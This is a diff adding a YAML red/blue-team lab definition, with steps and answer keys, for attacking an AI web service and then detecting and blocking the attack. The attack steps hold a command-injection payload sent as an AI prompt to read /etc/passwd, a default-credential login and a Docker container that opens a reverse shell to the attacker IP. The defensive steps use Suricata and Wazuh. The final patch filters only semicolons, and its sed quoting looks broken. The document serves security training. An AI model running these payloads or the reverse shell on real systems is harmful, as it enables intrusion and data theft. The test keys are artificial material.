@@ -1,0 +1,205 @@
+lab_id: battle-auto-NEWS-f8fad72b88
+title: Prompt Injection Attack Simulation
+version: ai
+course: battle-auto
+week: 0
+description: Red 팀은 AI 서비스에 대한 프롬프트 주입 취약점을 이용해 민감한 파일을 탈취하고, Blue 팀은 이를 탐지·분석·차단·복구한다.
+difficulty: medium
+duration_minutes: 120
+objectives:
+- 프롬프트 주입 공격 과정을 이해한다.
+- AI 서비스에서 입력 검증 부재를 악용한다.
+- 네트워크 및 호스트 기반 탐지 시스템을 활용한다.
+- 위협을 차단하고 서비스 패치를 수행한다.
+prerequisites:
+- Linux 기본 명령어
+- nmap, curl 사용법
+- Suricata 및 Wazuh 기본 이해
+infra_requirements:
+- attacker VM (10.20.30.201)
+- web VM (10.20.30.80)
+- secu VM (10.20.30.1)
+- siem VM (10.20.30.100)
+pass_threshold: 0.5
+steps:
+- order: 1
+  instruction: Perform a TCP SYN scan of the web VM to discover open ports.
+  hint: Use nmap with -sS and scan all ports.
+  category: recon
+  points: 5
+  answer: '프롬프트: nmap -sS -p- 10.20.30.80'
+  answer_detail: 전체 포트를 스캔하여 80, 8080, 3000 등 서비스 포트를 확인한다.
+  verify:
+    type: output_contains
+    expect: 80/tcp
+    field: stdout
+  target_vm: attacker
+  script: nmap -sS -p- 10.20.30.80
+  risk_level: low
+  bastion_prompt: attacker VM에서 웹 VM(10.20.30.80)의 모든 포트를 스캔하세요.
+- order: 2
+  instruction: Check the health endpoint of the AI service running on port 3000.
+  hint: Use curl to request /health.
+  category: scan
+  points: 5
+  answer: '프롬프트: curl -s http://10.20.30.80:3000/health'
+  answer_detail: 서비스가 정상 동작 중인지 확인한다.
+  verify:
+    type: output_contains
+    expect: 'status: ok'
+    field: stdout
+  target_vm: attacker
+  script: curl -s http://10.20.30.80:3000/health
+  risk_level: low
+  bastion_prompt: attacker VM에서 AI 서비스의 health endpoint를 확인하세요.
+- order: 3
+  instruction: Discover the API documentation to locate the prompt input endpoint.
+  hint: Access /api/docs on the same host.
+  category: scan
+  points: 5
+  answer: '프롬프트: curl -s http://10.20.30.80:3000/api/docs'
+  answer_detail: API 문서에서 POST /api/ai 경로를 확인한다.
+  verify:
+    type: output_contains
+    expect: POST /api/ai
+    field: stdout
+  target_vm: attacker
+  script: curl -s http://10.20.30.80:3000/api/docs
+  risk_level: low
+  bastion_prompt: attacker VM에서 AI 서비스의 API 문서를 조회해 프롬프트 입력 경로를 찾으세요.
+- order: 4
+  instruction: Exploit the prompt injection vulnerability to read /etc/passwd via
+    the AI API.
+  hint: Send a JSON payload with a malicious prompt that includes a shell command.
+  category: exploit
+  points: 15
+  answer: '프롬프트: curl -s -X POST -H ''Content-Type: application/json'' -d ''{"prompt":";
+    cat /etc/passwd"}'' http://10.20.30.80:3000/api/ai'
+  answer_detail: AI 서비스가 입력을 그대로 쉘에 전달하도록 유도해 /etc/passwd 내용을 반환한다.
+  verify:
+    type: output_contains
+    expect: root:x
+    field: stdout
+  target_vm: attacker
+  script: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"prompt":";
+    cat /etc/passwd"}'' http://10.20.30.80:3000/api/ai'
+  risk_level: high
+  bastion_prompt: attacker VM에서 AI API에 악의적인 프롬프트를 보내 /etc/passwd 내용을 반환하도록 하세요.
+- order: 5
+  instruction: Use the extracted information to log into DVWA and obtain a session
+    cookie.
+  hint: DVWA default credentials are admin:admin.
+  category: lateral
+  points: 10
+  answer: '프롬프트: curl -s -c cookies.txt -d ''username=admin&password=admin'' http://10.20.30.80:8080/login.php'
+  answer_detail: 로그인 성공 시 쿠키가 cookies.txt에 저장된다.
+  verify:
+    type: output_contains
+    expect: Login successful
+    field: stdout
+  target_vm: attacker
+  script: curl -s -c cookies.txt -d 'username=admin&password=admin' http://10.20.30.80:8080/login.php
+  risk_level: medium
+  bastion_prompt: attacker VM에서 DVWA에 로그인하고 세션 쿠키를 저장하세요.
+- order: 6
+  instruction: Establish persistence by deploying a malicious Docker container on
+    the web VM that opens a reverse shell to the attacker.
+  hint: Use a lightweight alpine image with netcat.
+  category: persistence
+  points: 15
+  answer: '프롬프트: ssh user@10.20.30.80 "docker run -d --name evil alpine sh -c ''apk
+    add --no-cache netcat-openbsd && nc -e /bin/sh 10.20.30.201 4444''"'
+  answer_detail: 컨테이너가 백그라운드에서 실행되며 4444 포트로 역쉘을 연결한다.
+  verify:
+    type: output_contains
+    expect: evil
+    field: stdout
+  target_vm: web
+  script: ssh user@10.20.30.80 "docker run -d --name evil alpine sh -c 'apk add --no-cache
+    netcat-openbsd && nc -e /bin/sh 10.20.30.201 4444'"
+  risk_level: high
+  bastion_prompt: attacker VM에서 웹 VM에 접속하여 지속성을 위해 역쉘을 실행하는 Docker 컨테이너를 배포하세요.
+- order: 7
+  instruction: On the secu VM, search Suricata logs for suspicious POST requests to
+    the AI endpoint.
+  hint: grep for '/api/ai' in eve.json.
+  category: detect
+  points: 10
+  answer: '프롬프트: grep ''/api/ai'' /var/log/suricata/eve.json'
+  answer_detail: 해당 로그 라인에 alert 필드가 포함되어 있으면 탐지 성공.
+  verify:
+    type: output_contains
+    expect: '"alert"'
+    field: stdout
+  target_vm: secu
+  script: grep '/api/ai' /var/log/suricata/eve.json
+  risk_level: low
+  bastion_prompt: secu VM에서 Suricata 로그를 검색해 /api/ai에 대한 의심스러운 POST를 찾으세요.
+- order: 8
+  instruction: On the siem VM, analyze Wazuh alerts to find file access events for
+    /etc/passwd.
+  hint: Use jq to filter alerts.json.
+  category: analyze
+  points: 10
+  answer: '프롬프트: jq ''.[] | select(.data.file == "/etc/passwd")'' /var/ossec/logs/alerts/alerts.json'
+  answer_detail: 해당 이벤트가 존재하면 파일이 비정상적으로 읽힌 것으로 판단한다.
+  verify:
+    type: output_contains
+    expect: /etc/passwd
+    field: stdout
+  target_vm: siem
+  script: jq '.[] | select(.data.file == "/etc/passwd")' /var/ossec/logs/alerts/alerts.json
+  risk_level: low
+  bastion_prompt: siem VM에서 Wazuh 알림 로그를 분석해 /etc/passwd 파일 접근 이벤트를 찾으세요.
+- order: 9
+  instruction: Block outbound traffic from the web VM to the attacker IP (10.20.30.201)
+    using nftables on the secu VM.
+  hint: Add a rule to the ip filter table for output direction.
+  category: contain
+  points: 10
+  answer: '프롬프트: nft add rule ip filter output ip daddr 10.20.30.201 drop'
+  answer_detail: 규칙이 적용되면 웹 VM에서 공격자 IP로의 모든 패킷이 차단된다.
+  verify:
+    type: output_contains
+    expect: handle
+    field: stdout
+  target_vm: secu
+  script: nft add rule ip filter output ip daddr 10.20.30.201 drop
+  risk_level: medium
+  bastion_prompt: secu VM에서 nftables를 사용해 웹 VM에서 공격자 IP(10.20.30.201)로의 모든 아웃바운드 트래픽을
+    차단하세요.
+- order: 10
+  instruction: Patch the AI service on the web VM to reject prompts containing a semicolon.
+  hint: Edit the application file to add a simple validation check.
+  category: remediate
+  points: 15
+  answer: '프롬프트: ssh user@10.20.30.80 "sed -i ''/def handle_prompt/ a\    if ";" in
+    prompt:\n        return \"Invalid input\"'' /var/www/ai/app.py"'
+  answer_detail: 수정 후 재시작하면 세미콜론이 포함된 프롬프트는 'Invalid input'을 반환한다.
+  verify:
+    type: output_contains
+    expect: Invalid input
+    field: stdout
+  target_vm: web
+  script: ssh user@10.20.30.80 "sed -i '/def handle_prompt/ a\    if ";" in prompt:\n        return
+    \"Invalid input\"' /var/www/ai/app.py"
+  risk_level: medium
+  bastion_prompt: Blue 팀이 웹 VM에 접속해 AI 서비스 코드를 수정해 프롬프트에 세미콜론이 포함되면 거부하도록 패치를 적용하세요.
+- order: 11
+  instruction: Verify that the AI endpoint no longer returns file contents when the
+    malicious prompt is sent.
+  hint: Repeat the exploit curl command and check for the error message.
+  category: detect
+  points: 10
+  answer: '프롬프트: curl -s -X POST -H ''Content-Type: application/json'' -d ''{"prompt":";
+    cat /etc/passwd"}'' http://10.20.30.80:3000/api/ai'
+  answer_detail: 출력에 'Invalid input'이 포함되어 있으면 패치가 성공한 것이다.
+  verify:
+    type: output_contains
+    expect: Invalid input
+    field: stdout
+  target_vm: attacker
+  script: 'curl -s -X POST -H ''Content-Type: application/json'' -d ''{"prompt":";
+    cat /etc/passwd"}'' http://10.20.30.80:3000/api/ai'
+  risk_level: low
+  bastion_prompt: attacker VM에서 동일한 악의적인 프롬프트를 다시 보내어 패치가 적용됐는지 확인하세요.
